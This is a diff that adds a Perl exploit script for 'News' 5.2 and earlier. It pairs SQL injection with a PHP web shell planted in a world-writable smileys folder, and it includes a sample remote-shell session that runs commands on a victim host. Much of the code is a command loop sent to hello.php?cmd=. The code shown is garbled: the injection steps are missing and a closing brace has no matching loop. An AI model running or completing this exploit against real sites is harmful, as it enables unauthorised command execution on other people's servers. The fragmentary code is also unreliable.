@@ -1,0 +1,73 @@
+#!/usr/bin/perl
+#
+#   VulnScr: News version 5.2 and prior
+#    E-mail: contact@vincent-leclercq.com
+#       Web: www.vincent-leclercq.com
+#
+#      Date: Thu June 29 12:01 2006
+#   Credits: DarkFig (gmdarkfig@gmail.com)
+#      Vuln: XSS, Full Path Disclosure, SQL Injection
+# Advisorie: http://www.acid-root.new.fr/advisories/news52.txt (french =))
+#   Exploit: Create a php file (system($cmd)) in a dir ((smileys)chmoded 777 during the installation of the script)
+#
+#
+#  +-----------------------------------------+
+#  | News &lt;= 5.2 SQL Injection (cmd exec) ---|
+#  +-----------------------------------------+
+#  [+]Full path: OK [/home/www/victim/news52]
+#  [+]Prefix: OK [news_]
+#  [+]File exist: OK
+#  [localhost]uname -a
+#  Linux ws6 2.6.16-SE-k8 #6 SMP PREEMPT Thu May 11 18:19:55 UTC 2006 i686 GNU/Linux
+#  [localhost]exit
+#  +-----------------------------------------+
+#
+use LWP::UserAgent;
+use LWP::Simple;
+use Getopt::Long;
+
+
+#
+# Argvs
+#
+header();
+if(!$ARGV[1]){ &amp;usageis; }
+GetOptions( &#039;host=s&#039;  =&gt; \$host,
+            &#039;path=s&#039;  =&gt; \$path,
+           );
+if($host =~ /http:\/\/(.*)/){
+  $host = $1;
+}
+
+
+#
+# Vars
+#
+my $helurl = &#039;http://&#039;.$host.$path;
+my $uagent = &#039;Perlnamigator&#039;;
+my $timeut = &#039;30&#039;;
+my $errr00 = &quot;[-]Can&#039;t connect to the host\n&quot;;
+my $errr01 = &quot;[-]Can&#039;t get the full path of the website\n&quot;;
+my $errr02 = &quot;[-]Can&#039;t get the table prefix\n&quot;;
+my $errr03 = &quot;[-]The php file doesn&#039;t exist\n&quot;;
+if($cmd eq &quot;exit&quot;){ &amp;the_end; }
+  $req5 = get($helurl.&#039;admin/smileys/hello.php?cmd=&#039;.$cmd) or print $errr00 and the_end();
+  print $req5, &quot;\n&quot;;
+}
+
+sub usageis {
+  print &quot;| Usage: -host localhost -path /news/  ---| \n&quot;;
+  &amp;the_end;
+}
+
+sub the_end {
+  print &quot;+-----------------------------------------+\n&quot;;
+  exit;
+}
+
+sub header {
+  print &quot;\n+-----------------------------------------+\n&quot;;
+  print &quot;| News &lt;= 5.2 SQL Injection (cmd exec) ---|\n&quot;;
+  print &quot;+-----------------------------------------+\n&quot;;
+}
+
